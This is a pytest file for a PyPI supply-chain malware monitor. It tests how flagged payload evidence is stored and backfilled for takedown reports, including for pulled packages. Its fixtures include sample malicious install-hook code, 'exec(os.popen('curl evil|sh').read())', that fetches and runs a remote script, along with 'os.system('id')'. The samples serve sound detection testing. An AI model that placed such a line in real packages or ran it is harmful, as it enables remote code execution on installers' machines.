"""Payload-evidence persistence: stored flagged code is a self-contained takedown-report source that
survives a device move and the package being pulled from PyPI (after which re-fetch fails)."""
import json
from pydiffwatch import orchestrator, store, fetcher
from pydiffwatch.config import Config
from pydiffwatch.models import Verdict, Diff, TriageResult, FiredRule, ArtifactSet, NewRelease


def _artifactset(pkg, ver, new_files, prior_files):
    return ArtifactSet(pkg, ver, "0.9", "sdist", new_files, prior_files, {},
                       added_binaries=[], is_new_package=False, maintainer_metadata=None,
                       added_dep_findings=[])


def _queue_suspicious(cfg, tmp_path):
    conn = store.connect(cfg); store.init_schema(conn)
    rid = store.record_release(conn, "p", "1.0", 5, False, "0.9", "sdist")
    d = Diff("p", "1.0", False, [], [])
    tr = TriageResult(50.0, [FiredRule("autoexec", 50.0, "setup.py", (1, 2))], True)
    v = Verdict("p", "1.0", "suspicious", 50.0, tr.fired_rules, False, confidence=0.6,
                attack_type="install-hook-rce", reasoning="model says...", model="qwen-singleshot")
    orchestrator._review_escalated(cfg, conn, type("R", (), {"review": lambda s, d, tr: v})(), d, tr, rid)
    return conn, rid


def test_get_evidence_returns_stored_payload(tmp_path):
    cfg = Config(db_path=tmp_path / "db.sqlite", lock_path=tmp_path / "l")
    conn = store.connect(cfg); store.init_schema(conn)
    rid = store.record_release(conn, "p", "1.0", 5, False, "0.9", "sdist")
    store.update_evidence(conn, rid, "--- file: setup.py (modified) ---\n+ os.system('id')")
    conn.close()
    assert "os.system('id')" in orchestrator.get_evidence(cfg, rid)
    assert orchestrator.get_evidence(cfg, 9999) is None   # unknown release id


def test_list_pending_prefers_stored_evidence_without_refetch(tmp_path, monkeypatch):
    cfg = Config(db_path=tmp_path / "db.sqlite", cache_dir=tmp_path / "c", lock_path=tmp_path / "l")
    conn, rid = _queue_suspicious(cfg, tmp_path)
    store.update_evidence(conn, rid, "STORED-EVIDENCE-BLOB os.system('id')")
    conn.close()
    # If list_pending re-fetched despite stored evidence, this would raise -> proves no re-fetch.
    def _boom(cfg, rel): raise AssertionError("must not re-fetch when evidence is stored")
    monkeypatch.setattr(fetcher, "fetch_artifacts", _boom)
    items = orchestrator.list_pending(cfg)
    assert len(items) == 1
    assert items[0]["diff_text"] == "STORED-EVIDENCE-BLOB os.system('id')"
    assert items[0]["fetch_error"] is None


def test_list_pending_falls_back_to_refetch_when_no_stored_evidence(tmp_path, monkeypatch):
    cfg = Config(db_path=tmp_path / "db.sqlite", cache_dir=tmp_path / "c", lock_path=tmp_path / "l")
    conn, rid = _queue_suspicious(cfg, tmp_path)   # no evidence stored (release_id had none)
    conn.close()
    monkeypatch.setattr(fetcher, "fetch_artifacts", lambda cfg, rel: None)   # re-fetch path, unavailable
    items = orchestrator.list_pending(cfg)
    assert items[0]["diff_text"] is None   # fell back to re-fetch, which returned no sdist


def _malicious_verdict(pkg, ver):
    return Verdict(pkg, ver, "malicious", 75.0, [], True, confidence=0.95,
                   attack_type="install-hook-rce", reasoning="r", model="qwen-singleshot")


def test_backfill_captures_evidence_for_existing_flagged_row(tmp_path, monkeypatch):
    cfg = Config(db_path=tmp_path / "db.sqlite", cache_dir=tmp_path / "c", lock_path=tmp_path / "l")
    conn = store.connect(cfg); store.init_schema(conn)
    rid = store.record_release(conn, "p", "1.1", 7, False, "1.0", "sdist")
    store.update_stage(conn, rid, "reviewed", 75.0,
                       json.dumps([{"rule": "autoexec", "weight": 45.0, "file": "setup.py", "lines": [2, 2]}]))
    store.record_verdict(conn, rid, _malicious_verdict("p", "1.1"))   # reportable -> in default scope
    conn.close()
    art = _artifactset("p", "1.1", {"setup.py": b"import os\nexec(os.popen('curl evil|sh').read())\n"},
                       {"setup.py": b"import os\n"})
    monkeypatch.setattr(fetcher, "fetch_artifacts", lambda cfg, rel: art)
    res = orchestrator.backfill_evidence(cfg)
    assert len(res) == 1 and res[0]["captured"] is True
    conn = store.connect(cfg)
    ev = conn.execute("SELECT evidence FROM releases WHERE id=?", (rid,)).fetchone()[0]
    assert ev is not None and "exec(os.popen('curl evil|sh').read())" in ev


def test_backfill_reports_failure_when_package_pulled(tmp_path, monkeypatch):
    # A confirmed-malicious package pulled from PyPI can no longer be re-fetched: report it, don't crash.
    cfg = Config(db_path=tmp_path / "db.sqlite", cache_dir=tmp_path / "c", lock_path=tmp_path / "l")
    conn = store.connect(cfg); store.init_schema(conn)
    rid = store.record_release(conn, "gone", "2.0", 8, False, "1.0", "sdist")
    store.update_stage(conn, rid, "reviewed", 80.0,
                       json.dumps([{"rule": "autoexec", "weight": 45.0, "file": "setup.py", "lines": [1, 1]}]))
    store.record_verdict(conn, rid, _malicious_verdict("gone", "2.0"))   # reportable -> in default scope
    conn.close()
    def _pulled(cfg, rel): raise fetcher.urllib.error.HTTPError("u", 404, "Not Found", {}, None)
    monkeypatch.setattr(fetcher, "fetch_artifacts", _pulled)
    res = orchestrator.backfill_evidence(cfg)
    assert len(res) == 1 and res[0]["captured"] is False and "404" in res[0]["error"]
    conn = store.connect(cfg)
    assert conn.execute("SELECT evidence FROM releases WHERE id=?", (rid,)).fetchone()[0] is None


def test_backfill_reconstructs_first_release_scan(tmp_path, monkeypatch):
    # Detected as a first release (whole-package scan). Today a predecessor exists, so the naive update
    # diff hides the payload (unchanged since the prior version) -> 0 code rules. Backfill must reproduce
    # the first-release scan (every file added) and still capture the payload for the takedown report.
    cfg = Config(db_path=tmp_path / "db.sqlite", cache_dir=tmp_path / "c", lock_path=tmp_path / "l")
    conn = store.connect(cfg); store.init_schema(conn)
    rid = store.record_release(conn, "fr", "1.0.44", 7, True, None, "sdist")   # is_first=True
    store.update_stage(conn, rid, "reviewed", 75.0,
                       json.dumps([{"rule": "autoexec", "weight": 45.0, "file": "pkg/__init__.py", "lines": [1, 2]}]))
    store.record_verdict(conn, rid, _malicious_verdict("fr", "1.0.44"))
    conn.close()
    payload = b"import os\nexec(os.popen('curl evil|sh').read())\n"
    # the re-fetch now resolves a predecessor that ALREADY contained the payload -> naive diff is empty
    art = ArtifactSet("fr", "1.0.44", "1.0.43", "sdist", {"pkg/__init__.py": payload},
                      {"pkg/__init__.py": payload}, {}, added_binaries=[], is_new_package=False,
                      maintainer_metadata=None, added_dep_findings=[])
    monkeypatch.setattr(fetcher, "fetch_artifacts", lambda cfg, rel: art)
    res = orchestrator.backfill_evidence(cfg)
    assert len(res) == 1 and res[0]["captured"] is True
    conn = store.connect(cfg)
    ev = conn.execute("SELECT evidence FROM releases WHERE id=?", (rid,)).fetchone()[0]
    assert ev is not None and "exec(os.popen('curl evil|sh').read())" in ev


def test_backfill_default_skips_benign_flagged_but_all_flag_includes_it(tmp_path, monkeypatch):
    # A low-weight rule fired but the verdict was benign -> not reportable. Default backfill skips it
    # (no wasted re-fetch); --all widens to it.
    cfg = Config(db_path=tmp_path / "db.sqlite", cache_dir=tmp_path / "c", lock_path=tmp_path / "l")
    conn = store.connect(cfg); store.init_schema(conn)
    rid = store.record_release(conn, "benignpkg", "1.1", 9, False, "1.0", "sdist")
    store.update_stage(conn, rid, "reviewed", 10.0,
                       json.dumps([{"rule": "primitives+obfuscation", "weight": 10.0, "file": "a.py", "lines": [1, 1]}]))
    store.record_verdict(conn, rid, Verdict("benignpkg", "1.1", "benign", 10.0, [], False,
                                            confidence=0.9, model="qwen-singleshot"))
    conn.close()
    art = _artifactset("benignpkg", "1.1", {"a.py": b"import os\nexec(os.popen('x').read())\n"}, {"a.py": b"import os\n"})
    monkeypatch.setattr(fetcher, "fetch_artifacts", lambda cfg, rel: art)
    assert orchestrator.backfill_evidence(cfg) == []                       # default: skipped
    res = orchestrator.backfill_evidence(cfg, all_flagged=True)            # --all: included
    assert len(res) == 1 and res[0]["captured"] is True


def test_backfill_skips_rows_with_evidence_or_no_rules(tmp_path, monkeypatch):
    cfg = Config(db_path=tmp_path / "db.sqlite", cache_dir=tmp_path / "c", lock_path=tmp_path / "l")
    conn = store.connect(cfg); store.init_schema(conn)
    already = store.record_release(conn, "has", "1.0", 1, False, None, "sdist")
    store.update_stage(conn, already, "reviewed", 75.0, json.dumps([{"rule": "x", "weight": 45.0, "file": "s.py", "lines": [1, 1]}]))
    store.update_evidence(conn, already, "already captured")
    norules = store.record_release(conn, "clean", "1.0", 2, False, None, "sdist")
    store.update_stage(conn, norules, "triaged", 0.0, "[]")
    conn.close()
    monkeypatch.setattr(fetcher, "fetch_artifacts",
                        lambda cfg, rel: (_ for _ in ()).throw(AssertionError("should not fetch skipped rows")))
    assert orchestrator.backfill_evidence(cfg) == []
